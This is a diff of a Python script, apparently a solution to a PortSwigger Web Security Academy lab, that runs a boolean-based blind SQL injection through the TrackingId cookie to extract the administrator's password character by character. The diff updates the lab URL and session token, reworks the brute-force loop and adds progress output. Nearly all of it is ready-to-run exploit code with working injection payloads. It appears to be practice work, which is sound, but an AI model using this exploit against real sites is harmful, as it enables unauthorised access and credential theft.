@@ -7,9 +7,9 @@
 import requests
 import string
 #Mquery = """' AND (SELECT 'PPPP' FROM users WHERE username='administrator' and Length(password)>1 )='PPPP"""
-Cquery = "CDYqbMCzSsI74o8w"
-SessionToken = 'sPU8wPuBIAAI87M8C0UlqtZ6xhADy7up'
-url = 'https://ac981f3c1e6a247780a93c0800b700f1.web-security-academy.net/'
+Cquery = "1UD2ou412FxzwwoT"
+SessionToken = 'm3wHlyH6OYEiuq8f1aOBLhWLb5C4H2qI'
+url = 'https://aca11f2c1ed55af7801b4f04003700a5.web-security-academy.net/'
 
 
 #Single Queary Requests. 
@@ -36,8 +36,7 @@ def passwordLength():
 def split(word): 
     return [char for char in word]  		
 
-def passwordbrute(pass_len):
-	passleng = pass_len
+def passwordbrute():
 	char = split(string.printable)
 	
 	Found_password = ""
@@ -47,13 +46,14 @@ def passwordbrute(pass_len):
 			Mquery = f"""' AND (SELECT SUBSTRING(password,1,{x}) from users WHERE username='administrator')='{Found_password}{y}' --"""
 			cookiesStuff = 		{'TrackingId':Cquery+Mquery,'session':SessionToken}
 			r = requests.get(url,cookies=cookiesStuff)
-			print(str(r.text.find('Welcome')) + " --- " + str(r.status_code))
+			print(str(r.text.find('Welcome')) + " --- StatusCode:" + str(r.status_code))
 			print(Mquery)
 			
-			if (r.text.find('Welcome') == 2000):
+			if (r.text.find('Welcome') != -1):
 				Found_password = Found_password + y
+				print(f"\r\nCharacter Found: {y} ({x}/20 Characters Found). Current Password is: {Found_password}\r\n")
 				break
 		
 		
-passwordbrute(2)
+passwordbrute()
 
